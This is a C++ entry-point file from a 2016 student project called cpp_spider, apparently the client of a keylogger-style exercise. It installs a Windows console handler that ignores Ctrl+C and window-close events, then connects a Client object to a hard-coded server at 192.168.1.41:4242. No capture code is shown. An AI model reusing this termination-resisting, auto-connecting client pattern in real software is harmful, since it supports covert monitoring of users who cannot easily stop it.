/*
** main.cpp for cpp_spider in /home/tarkick/repos/cpp_spider/src/client
**
** Made by tarkick
** Login   <tarkick@epitech.net>
**
** Started on  Sat Nov 05 19:26:15 2016 tarkick
** Last update Wed Nov 09 03:01:41 2016 tarkick
*/

#include <exception>
#include <cstdlib>
#include "Client.hh"

BOOL				exitHandler(DWORD fdwCtrlType)
{
	switch (fdwCtrlType)
	{
		case CTRL_C_EVENT:
			return(TRUE);
		case CTRL_CLOSE_EVENT:
			return(TRUE);
		case CTRL_BREAK_EVENT:
			return FALSE;
		case CTRL_LOGOFF_EVENT:
			return FALSE;
		case CTRL_SHUTDOWN_EVENT:
			return FALSE;
		default:
			return FALSE;
	}
}

int 				main()
{
	if (SetConsoleCtrlHandler((PHANDLER_ROUTINE) exitHandler, TRUE))
	{
		try
		{
			Client 	client("192.168.1.41", 4242);
		}
		catch (std::exception &error)
		{
			std::cerr << "Spider_client: " << error.what() << std::endl;
			return -1;
		}
	}
	else
		return -1;
	return 0;
}
